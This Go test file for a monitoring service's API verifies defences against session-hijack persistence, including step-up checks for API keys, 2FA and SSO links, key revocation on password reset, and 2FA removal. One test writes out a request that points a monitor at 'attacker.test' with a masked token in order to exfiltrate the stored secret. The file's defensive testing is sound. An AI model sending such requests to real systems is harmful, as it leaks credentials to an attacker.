package api

import (
	"encoding/json"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/Ariazonaa/statwarden/internal/auth"
	"github.com/Ariazonaa/statwarden/internal/notify/secrets"
)

// TestABorrowedSessionCannotBecomePermanentAccess walks the escalation the
// step-up exists to stop.
//
// Session plus CSRF token used to be sufficient for every one of these. An
// unlocked laptop, an XSS or a stolen cookie could therefore be converted into
// access that outlives the session and survives the owner changing their
// password: an API key the owner cannot see, an authenticator the owner does
// not hold, a single sign-on identity nobody looks at, or a fresh set of backup
// codes that invalidates the owner's printed ones.
//
// The attacker in this test has everything a session hijacker has — a valid
// session and a valid CSRF token — and only lacks the password.
func TestABorrowedSessionCannotBecomePermanentAccess(t *testing.T) {
	for _, tc := range []struct {
		name, method, path string
		body               any
		what               string
	}{
		{
			name: "mint an API key", method: http.MethodPost, path: "/api/v1/me/api-keys",
			body: createAPIKeyRequest{Name: "backdoor", Scopes: []string{ScopeRead}},
			what: "an API key outlives every session and no password change revokes it",
		},
		{
			name: "enrol an authenticator", method: http.MethodPost, path: "/api/v1/me/totp/enroll",
			body: stepUp{},
			what: "enrolling 2FA the owner does not hold locks them out, because " +
				"disabling it needs the password the attacker also does not have",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			h := newHarness(t)
			victim := h.setupAdmin() // the attacker holds this session

			rec := h.requestWith(tc.method, tc.path, tc.body, victim)
			if rec.Code != http.StatusForbidden {
				t.Fatalf("%s = %d, want 403 — %s; body %s",
					tc.name, rec.Code, tc.what, rec.Body.String())
			}
		})
	}
}

// A wrong password is refused as firmly as no password.
func TestStepUpRejectsTheWrongPassword(t *testing.T) {
	h := newHarness(t)
	admin := h.setupAdmin()

	rec := h.requestWith(http.MethodPost, "/api/v1/me/api-keys",
		createAPIKeyRequest{
			Name: "guess", Scopes: []string{ScopeRead},
			stepUp: stepUp{Password: "not-the-password"},
		}, admin)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("create with a wrong password = %d, want 403; body %s", rec.Code, rec.Body.String())
	}
}

// And the owner, who does know it, is not obstructed.
func TestStepUpLetsTheOwnerThrough(t *testing.T) {
	h := newHarness(t)
	admin := h.setupAdmin()

	rec := h.requestWith(http.MethodPost, "/api/v1/me/api-keys",
		createAPIKeyRequest{
			Name: "legitimate", Scopes: []string{ScopeRead},
			stepUp: stepUp{Password: "supersecret"},
		}, admin)
	if rec.Code != http.StatusCreated {
		t.Fatalf("create with the correct password = %d, want 201; body %s",
			rec.Code, rec.Body.String())
	}
}

// TestPasswordResetRevokesAPIKeys covers the other half: once an attacker HAS
// planted a key, recovering the account has to take it away.
//
// Killing sessions and leaving the keys means the account is still reachable by
// whoever prompted the reset, and the owner has no reason to suspect it —
// they just changed their password, after all. Keys the owner wants back can be
// reissued; a key the attacker keeps cannot be taken away later, because the
// owner does not know it exists.
func TestPasswordResetRevokesAPIKeys(t *testing.T) {
	h := newHarness(t)
	admin := h.setupAdmin()

	rec := h.requestWith(http.MethodPost, "/api/v1/me/api-keys",
		createAPIKeyRequest{
			Name: "planted", Scopes: []string{ScopeRead},
			stepUp: stepUp{Password: "supersecret"},
		}, admin)
	if rec.Code != http.StatusCreated {
		t.Fatalf("create key = %d, body %s", rec.Code, rec.Body.String())
	}
	var created struct {
		Secret string `json:"secret"`
	}
	mustJSON(t, rec, &created)

	// The key works before the reset.
	if got := h.requestKey(http.MethodGet, "/api/v1/monitors", created.Secret, nil); got.Code != http.StatusOK {
		t.Fatalf("planted key before reset = %d, want 200", got.Code)
	}

	// A full recovery: request the mail, follow the token, set a new password.
	h.requestReset("admin@example.com")
	token := h.lastResetToken()
	confirm := h.request(http.MethodPost, "/api/v1/auth/password-reset/confirm",
		passwordResetConfirmRequest{Token: token, NewPassword: "a-brand-new-password"})
	if confirm.Code != http.StatusNoContent {
		t.Fatalf("confirm reset = %d, body %s", confirm.Code, confirm.Body.String())
	}

	if got := h.requestKey(http.MethodGet, "/api/v1/monitors", created.Secret, nil); got.Code != http.StatusUnauthorized {
		t.Fatalf("planted key after a password reset = %d, want 401 — recovering "+
			"the account left the attacker's key working", got.Code)
	}
}

// The single sign-on half of the same escalation. It needs a provider-backed
// harness, so it sits outside the table above rather than being left out.
//
// A linked identity is a second way in that the owner never sees the
// credentials for and that no password change revokes — the quietest way to
// keep an account you have borrowed a session to.
func TestABorrowedSessionCannotAttachAnIdentity(t *testing.T) {
	h := newOIDCHarness(t, nil)
	victim := h.setupAdmin()

	rec := h.requestWith(http.MethodPost, "/api/v1/me/oidc/sso/link-start", stepUp{}, victim)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("link-start without the password = %d, want 403; body %s",
			rec.Code, rec.Body.String())
	}

	// And the owner still gets through.
	rec = h.requestWith(http.MethodPost, "/api/v1/me/oidc/sso/link-start",
		stepUp{Password: "supersecret"}, victim)
	if rec.Code != http.StatusOK {
		t.Fatalf("link-start with the password = %d, want 200; body %s",
			rec.Code, rec.Body.String())
	}
}

// TestDisablingTwoFactorNeedsTheSecondFactor
//
// Adding a factor demanded password AND code; removing one demanded only the
// password. That is backwards — taking the second factor away is the more
// dangerous of the two, and the first thing an attacker holding a stolen
// password reaches for. Both take the same proof now.
func TestDisablingTwoFactorNeedsTheSecondFactor(t *testing.T) {
	box, err := secrets.New("test-key-for-disable")
	if err != nil {
		t.Fatalf("new box: %v", err)
	}
	h := newHarnessWithBox(t, box)
	admin := h.setupAdmin()

	secret, err := auth.NewTOTPSecret()
	if err != nil {
		t.Fatalf("NewTOTPSecret: %v", err)
	}
	if err := h.store.SetUserTOTP(t.Context(), admin.userID, secret, true, nil); err != nil {
		t.Fatalf("enable 2FA: %v", err)
	}

	// The password alone is no longer enough.
	rec := h.requestWith(http.MethodPost, "/api/v1/me/totp/disable",
		stepUp{Password: "supersecret"}, admin)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("disable with the password alone = %d, want 403; body %s",
			rec.Code, rec.Body.String())
	}

	// With the code it goes through.
	code, err := auth.TOTPCode(secret, time.Now())
	if err != nil {
		t.Fatalf("TOTPCode: %v", err)
	}
	rec = h.requestWith(http.MethodPost, "/api/v1/me/totp/disable",
		stepUp{Password: "supersecret", TOTPCode: code}, admin)
	if rec.Code != http.StatusNoContent {
		t.Fatalf("disable with password and code = %d, want 204; body %s",
			rec.Code, rec.Body.String())
	}
}

// A lost authenticator is not a dead end: a backup code is accepted in its
// place, which is the whole reason backup codes exist.
func TestABackupCodeCanDisableTwoFactor(t *testing.T) {
	box, err := secrets.New("test-key-for-backup-disable")
	if err != nil {
		t.Fatalf("new box: %v", err)
	}
	h := newHarnessWithBox(t, box)
	admin := h.setupAdmin()

	secret, err := auth.NewTOTPSecret()
	if err != nil {
		t.Fatalf("NewTOTPSecret: %v", err)
	}
	plain, hashed, err := auth.GenerateBackupCodes()
	if err != nil {
		t.Fatalf("GenerateBackupCodes: %v", err)
	}
	if err := h.store.SetUserTOTP(t.Context(), admin.userID, secret, true, hashed); err != nil {
		t.Fatalf("enable 2FA: %v", err)
	}

	rec := h.requestWith(http.MethodPost, "/api/v1/me/totp/disable",
		stepUp{Password: "supersecret", TOTPCode: plain[0]}, admin)
	if rec.Code != http.StatusNoContent {
		t.Fatalf("disable with a backup code = %d, want 204; body %s",
			rec.Code, rec.Body.String())
	}
}

// TestAMaskedCredentialCannotFollowTheTargetElsewhere
//
// Read responses mask a monitor's credentials, and a write may submit the mask
// back to mean "keep what is stored". Those two rules together were an
// exfiltration primitive: someone who could edit a monitor but not read its
// password could point it at a host they control, submit the mask, and have the
// server send them the password on the next check. Redaction protected the
// value on screen and handed it over on the wire.
func TestAMaskedCredentialCannotFollowTheTargetElsewhere(t *testing.T) {
	h := newHarness(t)
	h.monReg.Register(secretChecker{})
	admin := h.setupAdmin()

	rec := h.requestWith(http.MethodPost, "/api/v1/monitors", monitorRequest{
		Name: "db", Type: "secretty", Interval: 60,
		Config: json.RawMessage(`{"url":"https://db.internal","token":"s3cr3t"}`),
	}, admin)
	if rec.Code != http.StatusCreated {
		t.Fatalf("create = %d, body %s", rec.Code, rec.Body.String())
	}
	var created monitorView
	mustJSON(t, rec, &created)

	// The read masks it, as designed.
	if !strings.Contains(string(created.Config), monitorSecretPlaceholder) {
		t.Fatalf("the token was not masked on read: %s", created.Config)
	}

	// Now move the host and hand the mask back.
	rec = h.requestWith(http.MethodPut, monitorPath(created.ID, ""), monitorRequest{
		Name: "db", Type: "secretty", Interval: 60,
		Config: json.RawMessage(`{"url":"https://attacker.test","token":"` +
			monitorSecretPlaceholder + `"}`),
	}, admin)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("moving the host with a masked password = %d, want 400; body %s",
			rec.Code, rec.Body.String())
	}

	// The stored monitor is untouched: still the original host, still its
	// password. A refusal that had already written half the change would be its
	// own problem.
	stored, err := h.store.GetMonitor(t.Context(), created.ID)
	if err != nil {
		t.Fatalf("GetMonitor: %v", err)
	}
	if !strings.Contains(string(stored.Config), "db.internal") {
		t.Fatalf("the host changed despite the refusal: %s", stored.Config)
	}
	if !strings.Contains(string(stored.Config), "s3cr3t") {
		t.Fatalf("the stored password was lost: %s", stored.Config)
	}
}

// Editing anything OTHER than the target still carries the credential over —
// otherwise every rename would demand the password again.
func TestAMaskedCredentialSurvivesAnUnrelatedEdit(t *testing.T) {
	h := newHarness(t)
	h.monReg.Register(secretChecker{})
	admin := h.setupAdmin()

	rec := h.requestWith(http.MethodPost, "/api/v1/monitors", monitorRequest{
		Name: "db", Type: "secretty", Interval: 60,
		Config: json.RawMessage(`{"url":"https://db.internal","token":"s3cr3t"}`),
	}, admin)
	if rec.Code != http.StatusCreated {
		t.Fatalf("create = %d, body %s", rec.Code, rec.Body.String())
	}
	var created monitorView
	mustJSON(t, rec, &created)

	rec = h.requestWith(http.MethodPut, monitorPath(created.ID, ""), monitorRequest{
		Name: "database (renamed)", Type: "secretty", Interval: 120,
		Config: json.RawMessage(`{"url":"https://db.internal","token":"` +
			monitorSecretPlaceholder + `"}`),
	}, admin)
	if rec.Code != http.StatusOK {
		t.Fatalf("rename with a masked password = %d, want 200; body %s",
			rec.Code, rec.Body.String())
	}
	stored, err := h.store.GetMonitor(t.Context(), created.ID)
	if err != nil {
		t.Fatalf("GetMonitor: %v", err)
	}
	if !strings.Contains(string(stored.Config), "s3cr3t") {
		t.Fatalf("an unrelated edit wiped the credential: %s", stored.Config)
	}
}
